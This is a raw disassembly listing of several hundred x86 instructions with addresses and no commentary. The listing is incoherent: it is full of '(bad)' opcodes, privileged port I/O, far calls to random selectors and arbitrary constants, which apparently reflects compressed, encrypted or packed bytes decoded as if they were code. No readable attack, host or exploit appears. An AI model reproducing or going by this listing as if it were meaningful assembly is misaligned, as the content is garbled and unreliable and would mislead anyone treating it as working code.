  414724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414725:	mov    BYTE PTR [edi-0x7a],ch
  414728:	out    dx,eax
  414729:	xor    al,0x6e
  41472b:	fistp  WORD PTR [edi-0x16]
  41472e:	jge    0x4146cc
  414730:	icebp  
  414731:	rcl    ecx,0xcb
  414734:	fnsave [ebx-0x13]
  414737:	fcmovne st,st(7)
  414739:	lock (bad) [edx-0x35]
  41473d:	icebp  
  41473e:	sub    DWORD PTR [ebp-0x3e],0x5a
  414742:	add    al,BYTE PTR [edi-0x7a4c988d]
  414748:	dec    ecx
  414749:	repz pop ds
  41474b:	mov    edi,0xf2b5ddd
  414750:	out    dx,al
  414751:	xchg   ebx,eax
  414752:	jns    0x4146dd
  414754:	jg     0x414761
  414756:	in     eax,dx
  414757:	jns    0x414732
  414759:	pop    edx
  41475a:	aaa    
  41475b:	or     edx,DWORD PTR [ebx+0x2]
  41475e:	and    dh,BYTE PTR [edx+ebx*4+0x5eeaf63e]
  414765:	cmp    DWORD PTR ds:0xd338f925,0x41caf75f
  41476f:	cmp    al,0x3f
  414771:	sbb    al,BYTE PTR [eax]
  414773:	enter  0xa385,0xf1
  414777:	ds dec ebx
  414779:	fistp  DWORD PTR [esi-0x72]
  41477c:	out    dx,al
  41477d:	lock push esp
  41477f:	cld    
  414780:	shl    DWORD PTR ds:[ebx+0x66],cl
  414784:	mov    ecx,0x17c5eea3
  414789:	dec    edx
  41478a:	leave  
  41478b:	cmp    al,0x28
  41478d:	push   esp
  41478e:	or     BYTE PTR [edi],ah
  414790:	test   al,0xe9
  414792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414793:	imul   ebp
  414795:	out    0xdd,eax
  414797:	ret    0xfe95
  41479a:	sub    BYTE PTR [esi],0x33
  41479d:	or     cl,ch
  41479f:	and    DWORD PTR [ebp+0x19],ebx
  4147a2:	push   esp
  4147a3:	jae    0x41477e
  4147a5:	jne    0x414773
  4147a7:	iret   
  4147a8:	xchg   edx,eax
  4147a9:	call   0xe51:0x7cff4924
  4147b0:	adc    al,BYTE PTR [edx]
  4147b2:	retf   0x2a5f
  4147b5:	cmc    
  4147b6:	fnstenv [ebx+0x11db0e16]
  4147bc:	leave  
  4147bd:	add    eax,0x380acb60
  4147c2:	scas   eax,DWORD PTR es:[edi]
  4147c3:	js     0x41480e
  4147c5:	jmp    0xcf8dd9e8
  4147ca:	and    DWORD PTR [eax+0x49],ecx
  4147cd:	adc    BYTE PTR ds:0x56630857,ch
  4147d3:	retf   
  4147d4:	dec    edx
  4147d5:	std    
  4147d6:	in     eax,dx
  4147d7:	cmc    
  4147d8:	(bad)  
  4147d9:	daa    
  4147da:	cld    
  4147db:	push   ebp
  4147dc:	cmp    al,0xc9
  4147de:	std    
  4147df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147e0:	call   FWORD PTR [edx-0x80]
  4147e3:	sar    BYTE PTR [ecx],1
  4147e5:	enter  0x5398,0x84
  4147e9:	das    
  4147ea:	mov    esp,0x100b59e5
  4147ef:	(bad)  
  4147f0:	jb     0x4147a3
  4147f2:	pop    ds
  4147f3:	dec    ecx
  4147f4:	call   0x242b:0x342076e6
  4147fb:	rol    BYTE PTR [edi-0x7d],1
  4147fe:	into   
  4147ff:	not    DWORD PTR [ecx-0x27]
  414802:	push   0xffffff87
  414804:	sbb    cl,BYTE PTR [edx]
  414806:	mov    edi,DWORD PTR [ecx]
  414808:	daa    
  414809:	adc    eax,0x7c317e70
  41480e:	fldcw  WORD PTR [ebx-0x4]
  414811:	sub    al,0x7
  414813:	fisttp QWORD PTR [ecx-0x7bbcd0fd]
  414819:	pop    ebx
  41481a:	mov    ds:0x94238069,al
  41481f:	add    cl,BYTE PTR [ecx-0x4fe4b27a]
  414825:	push   ss
  414826:	(bad)  
  414827:	cmp    eax,0x712ae0d1
  41482c:	fadd   DWORD PTR [ebp-0x46396697]
  414832:	sar    edi,cl
  414834:	push   eax
  414835:	iret   
  414836:	sub    ebp,DWORD PTR [edi-0xd]
  414839:	add    edx,DWORD PTR [edi-0x7a30c49f]
  41483f:	lock call 0x9572:0x9359100d
  414847:	sahf   
  414848:	cmp    eax,0xfd136423
  41484d:	mov    ebp,0x2ee7fe1c
  414852:	mov    WORD PTR [ebx-0x697236ae],fs
  414858:	jnp    0x414856
  41485a:	in     al,0xa8
  41485c:	ret    
  41485d:	lock sbb al,0xc1
  414860:	frstor [eax]
  414862:	rcl    edx,cl
  414864:	mov    al,0x28
  414866:	push   ss
  414867:	sbb    al,0xea
  414869:	shl    BYTE PTR [esi+0x22],0xe1
  41486d:	cmp    BYTE PTR [ebx-0xd9920fd],al
  414873:	loop   0x4148d2
  414875:	push   ecx
  414876:	inc    esi
  414877:	jns    0x4148c5
  414879:	xchg   esp,eax
  41487a:	sub    DWORD PTR [ebp+0xb036cd6],0xffffffee
  414881:	jnp    0x414843
  414883:	(bad)  
  414885:	rcr    BYTE PTR [edi],0xc
  414888:	xor    DWORD PTR [edi+0x14],ebp
  41488b:	add    eax,DWORD PTR [di-0x6b07]
  414890:	dec    esi
  414891:	retf   
  414892:	xchg   ebx,eax
  414893:	xor    BYTE PTR [bp+si],0xf6
  414897:	add    edi,DWORD PTR [edi-0x4d]
  41489a:	les    esp,FWORD PTR [eax-0x55]
  41489d:	jle    0x4148de
  41489f:	test   DWORD PTR [edx],ebp
  4148a1:	not    DWORD PTR [ebx]
  4148a3:	data16 sub BYTE PTR [eax+0x58a976a3],bl
  4148aa:	cmp    al,0x5b
  4148ac:	add    bh,BYTE PTR [edx+0x46b3638]
  4148b2:	bound  eax,QWORD PTR [ebx-0x1e]
  4148b5:	mov    al,ds:0x65ca8db
  4148ba:	pop    ds
  4148bb:	(bad)  
  4148bc:	mov    esp,0x83f60960
  4148c1:	or     DWORD PTR [ecx],edx
  4148c3:	mov    dl,0xd7
  4148c5:	fld    DWORD PTR [esi-0x1e]
  4148c8:	sub    BYTE PTR [edx],0x3b
  4148cb:	and    al,BYTE PTR ds:0x9982a73b
  4148d1:	je     0x41490f
  4148d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148d4:	std    
  4148d5:	dec    eax
  4148d6:	mov    dh,0xb0
  4148d8:	scas   al,BYTE PTR es:[edi]
  4148d9:	xchg   esp,eax
  4148da:	xor    eax,0x1bd09a2e
  4148df:	mov    ebx,0x5bc2de7c
  4148e4:	sbb    ecx,DWORD PTR [ecx-0x22]
  4148e7:	sbb    ebp,ecx
  4148e9:	aaa    
  4148ea:	cmp    dl,BYTE PTR [eax+0x8f0dd5f]
  4148f0:	cld    
  4148f1:	in     al,dx
  4148f2:	mov    ds:0x69b4bc31,eax
  4148f7:	mov    al,0xfc
  4148f9:	test   al,0xa9
  4148fb:	jbe    0x414933
  4148fd:	mov    cl,0xf2
  4148ff:	hlt    
  414900:	out    dx,al
  414901:	push   cs
  414902:	push   0xdba3ba1b
  414907:	dec    eax
  414908:	aam    0x50
  41490a:	je     0x41496e
  41490c:	mov    ah,0xcd
  41490e:	push   eax
  41490f:	sbb    eax,0x6d41fc56
  414914:	cwde   
  414915:	pop    ss
  414916:	fild   QWORD PTR [ebx]
  414918:	adc    DWORD PTR [ecx-0xa7bfb93],esi
  41491e:	daa    
  41491f:	lock inc edi
  414921:	mov    ebp,0x44eb23f3
  414926:	addr16 dec edx
  414928:	pop    fs
  41492a:	push   ds
  41492b:	mov    ds:0xaae8c38f,eax
  414930:	and    DWORD PTR [esi+0x594fabfa],0xffffffc8
  414937:	add    al,0x47
  414939:	inc    edi
  41493a:	in     al,0x40
  41493c:	mov    eax,0x4eb4cb33
  414941:	test   al,0xcc
  414943:	push   ds
  414944:	or     BYTE PTR [edi],0xc
  414947:	mov    ecx,0xdee9d69f
  41494c:	enter  0xca9c,0x85
  414950:	mov    ebx,0x25b1b4db
  414955:	mov    al,0xd8
  414957:	jo     0x41495f
  414959:	dec    edx
  41495a:	jae    0x41496f
  41495c:	test   DWORD PTR [eax+0x40107fc3],eax
  414962:	cmp    DWORD PTR [ebx],esp
  414964:	inc    ebx
  414965:	cmp    dh,bh
  414967:	xor    al,0xc9
  414969:	dec    edi
  41496a:	jl     0x414902
  41496c:	arpl   WORD PTR [eax+0x22],sp
  41496f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414970:	jecxz  0x4149d6
  414972:	ins    DWORD PTR es:[edi],dx
  414973:	add    cl,dh
  414975:	pop    ecx
  414976:	nop
  414977:	ret    
  414978:	or     ch,BYTE PTR [ebx-0x7a]
  41497b:	(bad)  
  41497c:	lds    esp,FWORD PTR [ecx+0x1af65010]
  414982:	sub    dl,BYTE PTR [edx+0x318016ea]
  414988:	in     eax,0x71
  41498a:	lock repnz loopne 0x41494b
  41498e:	cmp    BYTE PTR [ecx+0x1b1f2e3d],dh
  414994:	iret   
  414995:	cwde   
  414996:	xlat   BYTE PTR ds:[ebx]
  414997:	nop
  414998:	mov    ecx,0xb22b10dd
  41499d:	in     eax,0xd6
  41499f:	lods   al,BYTE PTR ds:[esi]
  4149a0:	mov    bh,0x60
  4149a2:	cli    
  4149a3:	jo     0x4149f2
  4149a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a6:	cwde   
  4149a7:	pop    es
  4149a8:	mov    ds:0x4415c2c8,eax
  4149ad:	mov    cl,0xc
  4149af:	cmp    eax,0xb8ff54b4
  4149b4:	xchg   ebp,eax
  4149b5:	jp     0x414a06
  4149b7:	mov    cl,BYTE PTR [esi+0x6e8ca7eb]
  4149bd:	cmp    bh,ch
  4149bf:	lds    edx,FWORD PTR [edx-0x367d6291]
  4149c5:	mov    edi,0x68470c41
  4149ca:	test   cl,cl
  4149cc:	pop    ss
  4149cd:	aad    0xa0
  4149cf:	dec    edi
  4149d0:	fisttp DWORD PTR [ebx]
  4149d2:	push   edx
  4149d3:	cmpps  xmm6,XMMWORD PTR [esi+0x324864a0],0xfb
  4149db:	in     al,dx
  4149dc:	test   bh,bl
  4149de:	sbb    BYTE PTR [ebx+0x55],0x16
  4149e2:	fisubr DWORD PTR [eax+0x1f]
  4149e5:	repz das 
  4149e7:	ficomp WORD PTR [esi]
  4149e9:	adc    eax,0x6a3acbb2
  4149ee:	clc    
  4149ef:	iret   
  4149f0:	inc    esp
  4149f1:	or     dh,dh
  4149f3:	stos   DWORD PTR es:[edi],eax
  4149f4:	mov    BYTE PTR [ecx-0x693f89d],dh
  4149fa:	mov    WORD PTR [ebx+0x551d461c],fs
  414a00:	int3   
  414a01:	fstp   QWORD PTR [ecx+0x20]
  414a04:	fiadd  DWORD PTR [ebp+0x44]
  414a07:	adc    edx,eax
  414a09:	mov    esp,0x8b3d3675
  414a0e:	cwde   
  414a0f:	outs   dx,BYTE PTR ds:[esi]
  414a10:	cmp    esi,DWORD PTR [ecx]
  414a12:	cmp    ebx,DWORD PTR [ecx]
  414a14:	loope  0x4149db
  414a16:	sbb    cl,BYTE PTR [ebp-0x3d]
  414a19:	push   ebp
  414a1a:	inc    esi
  414a1b:	mov    ds:0x7f244443,eax
  414a20:	mov    bl,0xbc
  414a22:	and    al,0x7d
  414a24:	mov    ecx,0x41a61d60
  414a29:	pusha  
  414a2a:	jnp    0x414a59
  414a2c:	jnp    0x414a0e
  414a2e:	jp     0x414a11
  414a30:	lods   al,BYTE PTR ds:[esi]
  414a31:	sbb    ebp,DWORD PTR [edi+eax*1]
  414a34:	fs inc esi
  414a36:	in     eax,dx
  414a37:	add    BYTE PTR [edi],bl
  414a39:	mov    ebp,0xdd25dd20
  414a3e:	pop    ebp
  414a3f:	xlat   BYTE PTR ds:[ebx]
  414a40:	push   ds
  414a41:	pop    ecx
  414a42:	push   es
  414a43:	data16 stos BYTE PTR es:[edi],al
  414a45:	arpl   bx,di
  414a47:	or     edi,DWORD PTR [eax]
  414a49:	mov    WORD PTR [ebp+0x49],es
  414a4c:	push   esp
  414a4d:	aam    0x17
  414a4f:	ins    BYTE PTR es:[edi],dx
  414a50:	popf   
  414a51:	daa    
  414a52:	xchg   edx,eax
  414a53:	popa   
  414a54:	adc    ah,bh
  414a56:	fnsave [ecx-0x77]
  414a59:	xor    DWORD PTR [edx-0x70],edi
  414a5c:	add    edx,edx
  414a5e:	mov    ah,0x13
  414a60:	mov    ch,0x9
  414a62:	mov    BYTE PTR ds:0xc3d4aba0,cl
  414a68:	mov    es,WORD PTR [edx]
  414a6a:	mov    bh,0x91
  414a6c:	out    0x3f,al
  414a6e:	jecxz  0x4149f8
  414a70:	adc    eax,0x828fc47f
  414a75:	lahf   
  414a76:	in     eax,0x31
  414a78:	xchg   esi,eax
  414a7a:	in     eax,0x32
  414a7c:	pop    esi
  414a7d:	xor    al,0xce
  414a7f:	jmp    0x95d399aa
  414a84:	push   ebx
  414a85:	mov    edx,DWORD PTR [edi-0x7e738d12]
  414a8b:	xchg   ecx,eax
  414a8c:	xlat   BYTE PTR ds:[ebx]
  414a8d:	outs   dx,BYTE PTR ds:[esi]
  414a8e:	in     eax,dx
  414a8f:	adc    al,0x2a
  414a91:	jae    0x414b04
  414a93:	outs   dx,BYTE PTR ds:[esi]
  414a94:	push   0x34
  414a96:	(bad)  
  414a98:	mov    eax,0x82b90f0a
  414a9d:	xor    al,0xc2
  414a9f:	loop   0x414aa6
  414aa1:	mov    DWORD PTR [esi-0x6],edi
  414aa4:	repz call 0xbb49e290
  414aaa:	nop
  414aab:	xchg   esi,eax
  414aac:	inc    ebp
  414aad:	outs   dx,BYTE PTR ds:[esi]
  414aae:	sbb    eax,0xb32e448e
  414ab3:	pop    ebx
  414ab4:	out    0x43,eax
  414ab6:	shr    DWORD PTR [ebx+0x18],cl
  414ab9:	ins    BYTE PTR es:[edi],dx
  414aba:	or     dh,ch
  414abc:	adc    eax,0x971e41ad
  414ac1:	xor    DWORD PTR [edx],esi
  414ac3:	imul   ebx,ebp,0xffffffa5
  414ac6:	dec    eax
  414ac7:	pop    esi
  414ac8:	pop    ecx
  414ac9:	pop    ss
  414aca:	cdq    
  414acb:	and    DWORD PTR [eax],edi
  414acd:	cs pop ds
  414acf:	mov    dh,0xb6
  414ad1:	adc    eax,0x66f23201
  414ad6:	jecxz  0x414a85
  414ad8:	int    0xa6
  414ada:	mov    ebp,DWORD PTR [eax]
  414adc:	and    eax,0x5ef80490
  414ae1:	into   
  414ae2:	cli    
  414ae3:	das    
  414ae4:	inc    edx
  414ae5:	jle    0x414a7c
  414ae7:	cli    
  414ae8:	push   ebp
  414ae9:	mov    edi,0xee53ad7e
  414aee:	dec    eax
  414aef:	stc    
  414af0:	push   cs
  414af1:	sti    
  414af2:	out    dx,eax
  414af3:	addr16 xchg esp,eax
  414af5:	lea    ebp,[eax+0x27]
  414af8:	sub    esp,DWORD PTR [esi-0x61]
  414afb:	jmp    0x414ad0
  414afd:	retf   0xd83f
  414b00:	out    dx,eax
  414b01:	xchg   ebx,eax
  414b02:	aas    
  414b03:	test   ch,ch
  414b05:	aam    0x47
  414b07:	ss aaa 
  414b09:	mov    edi,0x28cfd327
  414b0e:	in     al,dx
  414b0f:	outs   dx,DWORD PTR ds:[esi]
  414b10:	sub    ebp,DWORD PTR [esi+0x57]
  414b13:	sahf   
  414b14:	xchg   ebp,eax
  414b15:	or     eax,0xbc79529f
  414b1a:	lods   al,BYTE PTR ds:[esi]
  414b1b:	sub    bl,BYTE PTR [esi]
  414b1d:	and    eax,ecx
  414b1f:	jecxz  0x414b7f
  414b21:	test   eax,0x3dbfa5f2
  414b26:	add    al,0x69
  414b28:	adc    al,0x22
  414b2a:	test   al,0xd2
  414b2c:	std    
  414b2d:	adc    DWORD PTR [esi],ecx
  414b2f:	(bad)  
  414b30:	sbb    eax,0x8bcf7105
  414b35:	mov    edx,0x7022a9ef
  414b3a:	imul   edi,DWORD PTR [esi+0x74],0x3f3c8c4d
  414b41:	nop
  414b42:	cwde   
  414b43:	out    dx,eax
  414b44:	and    al,0xfb
  414b46:	sbb    DWORD PTR [ebx+0x7822eaec],esp
  414b4c:	scas   al,BYTE PTR es:[edi]
  414b4d:	sbb    al,BYTE PTR [ecx-0x54]
  414b50:	adc    edi,DWORD PTR [edi]
  414b52:	pop    ss
  414b53:	lahf   
  414b54:	push   ss
  414b55:	xor    eax,DWORD PTR [edi]
  414b57:	mov    ebx,0x79ac2bf9
  414b5c:	mov    al,ds:0xf835390d
  414b61:	fwait
  414b62:	inc    ebp
  414b63:	ret    0xe81a
  414b66:	ret    0x4235
  414b69:	cmp    BYTE PTR [esi],0xd5
  414b6c:	repz jg 0x414b40
  414b6f:	pavgb  mm5,QWORD PTR [ebp+0x33f3e2dd]
  414b76:	fwait
  414b77:	mov    ah,BYTE PTR [ebx-0x20947046]
  414b7d:	xor    cl,BYTE PTR [ebx+0x57]
  414b80:	js     0x414baa
  414b82:	mov    ecx,0x9e42f881
  414b87:	push   ebx
  414b88:	aad    0x47
  414b8a:	or     eax,0xca1e6ccb
  414b8f:	sbb    BYTE PTR ds:[edi-0x35],0x3b
  414b94:	icebp  
  414b95:	mov    BYTE PTR [edx+0x53],dl
  414b98:	jl     0x414ba6
  414b9a:	or     al,0xd7
  414b9c:	lock mov bl,0x18
  414b9f:	push   esi
  414ba0:	jmp    0xa26a35f6
  414ba5:	jmp    0x414be1
  414ba7:	push   ecx
  414ba8:	adc    BYTE PTR [ebp+edx*1-0x38],dl
  414bac:	sbb    al,0x6d
  414bae:	rdtsc  
  414bb0:	sbb    DWORD PTR [edi-0x7ab60e7c],0x16354a82
  414bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bbb:	icebp  
  414bbc:	and    dh,BYTE PTR [edi+0x52880b28]
  414bc2:	in     eax,dx
  414bc3:	pop    esp
  414bc4:	enter  0xa551,0xb4
  414bc8:	pop    ebx
  414bc9:	mov    ebp,0xd1d77bc4
  414bce:	clc    
  414bcf:	inc    ecx
  414bd0:	repz jp 0x414bb9
  414bd3:	fstp   DWORD PTR [edx-0x601c3e78]
  414bd9:	sbb    BYTE PTR [edx-0x55],dh
  414bdc:	(bad)  
  414bdd:	enter  0xe2c8,0x84
  414be1:	lahf   
  414be2:	lds    esp,FWORD PTR [edx-0x17]
  414be5:	push   ecx
  414be6:	inc    esi
  414be7:	aam    0x68
  414be9:	loope  0x414bde
  414beb:	scas   eax,DWORD PTR es:[edi]
  414bec:	mov    al,ds:0xcc720a92
  414bf1:	rol    DWORD PTR [ebp+0x1f2443f9],0xb2
  414bf8:	not    bl
  414bfa:	sub    DWORD PTR [ecx],esp
  414bfc:	and    bl,BYTE PTR [ecx+ecx*1]
  414bff:	push   cs
  414c00:	loop   0x414c5b
  414c02:	sub    eax,0x1b3878e2
  414c07:	inc    edx
  414c08:	sub    al,0x6c
  414c0a:	lock jne 0x414bfd
  414c0d:	out    0x8b,al
  414c0f:	gs sbb cl,ah
  414c12:	jnp    0x414c30
  414c14:	rcr    BYTE PTR [ebx+eax*1+0x463b2d70],cl
  414c1b:	stos   BYTE PTR es:[edi],al
  414c1c:	shl    BYTE PTR [ebp+0x51],cl
  414c1f:	ret    0x6117
  414c22:	aam    0x94
  414c24:	push   0x5f81f52f
  414c29:	mov    eax,ds:0x87e8c3f0
  414c2e:	(bad)  
  414c2f:	(bad)  
  414c30:	or     al,al
  414c32:	(bad)  
  414c33:	enter  0x7af7,0x18
  414c37:	mov    edi,0xede33113
  414c3c:	aas    
  414c3d:	scas   eax,DWORD PTR es:[edi]
  414c3e:	cdq    
  414c3f:	cld    
  414c40:	js     0x414c4b
  414c42:	mov    ?,WORD PTR [ebx+eiz*8-0x29]
  414c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c47:	sub    DWORD PTR [esi+0x42149c6a],ebx
  414c4d:	mov    esi,0x74a89647
  414c52:	push   cs
  414c53:	and    ecx,DWORD PTR [edi-0x3cf99edd]
  414c59:	mov    ebp,0x31a64bc
  414c5e:	adc    BYTE PTR [ecx+edi*8+0x715ded2],al
  414c65:	mov    bl,ch
  414c67:	cmp    al,0x6d
  414c69:	push   DWORD PTR [ebx-0x2f]
  414c6c:	arpl   WORD PTR [esi-0x223001d6],bx
  414c72:	inc    eax
  414c73:	shr    BYTE PTR [ebx-0x14],1
  414c76:	cmp    ch,ah
  414c78:	push   ebp
  414c79:	cli    
  414c7a:	int3   
  414c7b:	shr    BYTE PTR [edx+ecx*4],0x2b
  414c7f:	fisub  DWORD PTR [ebx]
  414c81:	mov    BYTE PTR [edx-0x55],al
  414c84:	icebp  
  414c85:	(bad)  
  414c86:	dec    eax
  414c87:	ss pop es
  414c89:	movsx  eax,ch
  414c8c:	sbb    dh,cl
  414c8e:	pop    ds
  414c8f:	(bad)  
  414c90:	shl    cl,cl
  414c92:	loopne 0x414cc4
  414c94:	mov    al,ds:0xc5f84543
  414c99:	dec    edi
  414c9a:	inc    eax
  414c9b:	std    
  414c9c:	xlat   BYTE PTR cs:[ebx]
  414c9e:	shl    bl,1
  414ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ca1:	out    0x8a,al
  414ca3:	inc    ecx
  414ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca5:	add    BYTE PTR [eax+0x75],al
  414ca8:	inc    eax
  414ca9:	push   0x6dfa6415
  414cae:	jge    0x414cee
  414cb0:	jae    0x414cd5
  414cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cb3:	or     al,0x78
  414cb5:	and    ebx,DWORD PTR [ecx-0x4a1a7704]
  414cbb:	xor    eax,0xf639dd24
  414cc0:	in     eax,0x3f
  414cc2:	push   ds
  414cc3:	lds    esi,FWORD PTR [eax]
  414cc5:	and    al,0xc4
  414cc7:	mov    ebp,0x14c90d0b
  414ccc:	jp     0x414ca5
  414cce:	inc    esp
  414ccf:	ja     0x414d27
  414cd1:	xchg   esp,eax
  414cd2:	mov    bl,0xde
  414cd4:	push   0x73
  414cd6:	xor    DWORD PTR [esi],ebp
  414cd8:	and    ch,BYTE PTR [ebx+0x73]
  414cdb:	xchg   ebx,eax
  414cdc:	outs   dx,DWORD PTR ds:[esi]
  414cdd:	adc    BYTE PTR [edx+0x6b55e1f6],ch
  414ce3:	cmc    
  414ce4:	imul   ebp
  414ce6:	mov    dl,0x66
  414ce8:	sub    ch,BYTE PTR [eax-0x7d]
  414ceb:	mov    esi,0x2e06bffa
  414cf0:	sub    esi,ebp
  414cf2:	test   eax,0xa24df647
  414cf7:	pop    ebp
  414cf8:	sub    al,0x9d
  414cfa:	or     BYTE PTR [ebp+0x2f008ce8],bl
  414d00:	stc    
  414d01:	push   0x28
  414d03:	mov    ebx,0xf2403c47
  414d08:	test   al,0x27
  414d0a:	adc    ebx,edi
  414d0c:	je     0x414cfe
  414d0e:	iret   
  414d0f:	cmpps  xmm1,xmm6,0x39
  414d13:	adc    al,0x68
  414d16:	enter  0x4e66,0xe
  414d1a:	xchg   esp,eax
  414d1b:	jmp    0xd4d:0x147837be
  414d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d23:	xor    bl,0xef
  414d26:	xlat   BYTE PTR ds:[ebx]
  414d27:	pop    esi
  414d28:	inc    ebp
  414d29:	push   ss
  414d2a:	cmp    ecx,DWORD PTR [ebx-0x48]
  414d2d:	cmc    
  414d2e:	inc    ebx
  414d2f:	sahf   
  414d30:	cdq    
  414d31:	ds jns 0x414d3d
  414d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d35:	sahf   
  414d36:	sub    edx,0xffffffbf
  414d39:	pop    edi
  414d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d3b:	lahf   
  414d3c:	mov    ebp,0xbb9d4835
  414d41:	mov    dh,0xe
  414d43:	mov    esp,ds
  414d45:	and    BYTE PTR [edx-0x17],0x5
  414d49:	das    
  414d4a:	jmp    0x414d87
  414d4c:	cmp    DWORD PTR [edx],edi
  414d4e:	add    eax,0x2f6e781a
  414d53:	sub    esp,0x5d
  414d56:	iret   
  414d57:	repnz xor BYTE PTR [edx-0x1e254c1d],bh
  414d5e:	cdq    
  414d5f:	clc    
  414d60:	inc    esp
  414d61:	call   0xf52a:0xa00fd3f4
  414d68:	imul   ebp,DWORD PTR [esi+0x3c],0x5d
  414d6c:	dec    eax
  414d6d:	ror    BYTE PTR [edx-0x50],0xff
  414d71:	mov    esi,0xce7a23e9
  414d76:	ins    BYTE PTR es:[edi],dx
  414d77:	addr16 mov esp,0xfd7935e5
  414d7d:	lods   al,BYTE PTR ds:[esi]
  414d7e:	out    dx,eax
  414d7f:	mov    WORD PTR [edx+0x11ea5aea],ss
  414d85:	in     eax,0x6d
  414d87:	and    BYTE PTR [edx+0x4b2ac5b8],al
  414d8d:	jge    0x414df2
  414d8f:	pop    edi
  414d90:	sar    DWORD PTR [esi+0x5052b81d],cl
  414d96:	xchg   edi,eax
  414d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d98:	mov    ds:0x471b1074,al
  414d9d:	jmp    DWORD PTR [ebx-0x2e60562c]
  414da3:	mov    ecx,0x93d4780b
  414da8:	iret   
  414da9:	sti    
  414daa:	pushf  
  414dab:	sub    eax,0xd93614e3
  414db0:	adc    BYTE PTR [edx+ebx*8+0x553c4e2a],cl
  414db7:	scas   al,BYTE PTR es:[edi]
  414db8:	repnz dec edx
  414dba:	add    eax,0xcf6965c1
  414dbf:	retf   
  414dc0:	cdq    
  414dc1:	add    ecx,DWORD PTR [eax-0x4412f22f]
  414dc7:	cmp    eax,0xc0d8022e
  414dcc:	js     0x414d93
  414dce:	and    al,0x4d
  414dd1:	jmp    0xdb91:0x1bafe20b
  414dd8:	in     eax,dx
  414dd9:	jo     0x414d60
  414ddb:	mov    bl,0x3e
  414ddd:	arpl   sp,di
  414ddf:	dec    ebx
  414de0:	out    dx,al
  414de1:	ins    DWORD PTR es:[edi],dx
  414de2:	inc    ebp
  414de3:	pushf  
  414de4:	inc    eax
  414de5:	mov    al,0x1a
  414de7:	and    eax,0x403c4d28
  414dec:	jbe    0x414e18
  414dee:	add    DWORD PTR [eax-0xa],edi
  414df1:	aad    0x9
  414df3:	(bad)  
  414df4:	aam    0x9c
  414df6:	add    al,0x37
  414df8:	and    DWORD PTR [eax],0x13bd9b08
  414dfe:	push   ecx
  414dff:	sahf   
  414e00:	mov    eax,ds:0x2e30ba9f
  414e05:	ss inc edx
  414e07:	add    al,BYTE PTR [edx]
  414e09:	sahf   
  414e0a:	and    BYTE PTR [ebp+0x7748de9],0xd8
  414e11:	mov    DWORD PTR [ebx+0x2],0xa6a88616
  414e18:	and    DWORD PTR [edx-0x502bd5f8],ecx
  414e1e:	jno    0x414e33
  414e20:	in     al,dx
  414e21:	int    0xc9
  414e23:	xchg   esi,eax
  414e24:	dec    ebx
  414e25:	sbb    al,0xa8
  414e27:	sub    BYTE PTR [edi-0x2fff5081],bl
  414e2d:	mov    ecx,0x45bf62f
  414e32:	popf   
  414e33:	call   0x6b5d4bf2
  414e38:	add    BYTE PTR [ebx+0x4126e34],bh
  414e3e:	data16 test ah,bh
  414e41:	outs   dx,BYTE PTR ds:[esi]
  414e42:	inc    eax
  414e43:	outs   dx,DWORD PTR ds:[esi]
  414e44:	lods   al,BYTE PTR ds:[esi]
  414e45:	dec    esp
  414e46:	mov    dl,0x40
  414e48:	and    BYTE PTR [eax+0x4d],ch
  414e4b:	xor    DWORD PTR [esi-0x2b],esi
  414e4e:	add    DWORD PTR [edx+0x7d],0x53
  414e52:	pop    esp
  414e53:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e55:	sbb    eax,0x83bda29d
  414e5a:	push   edi
  414e5b:	into   
  414e5c:	in     eax,dx
  414e5d:	or     esi,edi
  414e5f:	or     DWORD PTR [edx],ebp
  414e61:	shr    DWORD PTR [esi+0x61890f72],1
  414e67:	retf   0xd1e5
  414e6a:	pop    ss
  414e6b:	mov    esi,0x6d0f13da
  414e70:	mov    ecx,0x73d58ce9
  414e75:	enter  0x8f22,0x6
  414e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e7a:	and    ebp,edi
  414e7c:	test   eax,0xd5cd75cd
  414e81:	in     eax,dx
  414e82:	int    0xff
  414e84:	outs   dx,BYTE PTR ds:[esi]
  414e85:	hlt    
  414e86:	mov    edi,0xbf546a30
  414e8b:	inc    ebx
  414e8c:	mov    edx,0x855e2fcf
  414e91:	xchg   edx,eax
  414e92:	dec    esp
  414e93:	fmulp  st(4),st
  414e95:	dec    eax
  414e96:	push   ss
  414e97:	test   BYTE PTR [edx],bh
  414e99:	mov    eax,ds:0x400f4714
  414e9e:	push   ebp
  414e9f:	in     eax,0xc5
  414ea1:	repz push ecx
  414ea3:	jp     0x414f0f
  414ea5:	fild   DWORD PTR ss:[eax+0x3d]
  414ea9:	inc    DWORD PTR [ebp-0x6071d251]
  414eaf:	mov    bl,0x94
  414eb1:	sub    ah,dh
  414eb3:	push   0x6a
  414eb5:	sub    eax,DWORD PTR [edx]
  414eb7:	dec    ebp
  414eb8:	inc    edx
  414eb9:	mov    cl,0x8e
  414ebb:	sbb    al,0xb2
  414ebd:	stc    
  414ebe:	mov    al,0x2f
  414ec0:	ret    0xbd4f
  414ec3:	sbb    al,0x39
  414ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ec6:	lods   ax,WORD PTR ds:[esi]
  414ec8:	push   ebx
  414ec9:	pop    ds
  414eca:	ins    WORD PTR es:[edi],dx
  414ecc:	imul   edi,DWORD PTR [ecx],0x912ec007
  414ed2:	cs popa 
  414ed4:	xchg   edx,eax
  414ed5:	popa   
  414ed6:	sahf   
  414ed7:	and    eax,0xb12895ea
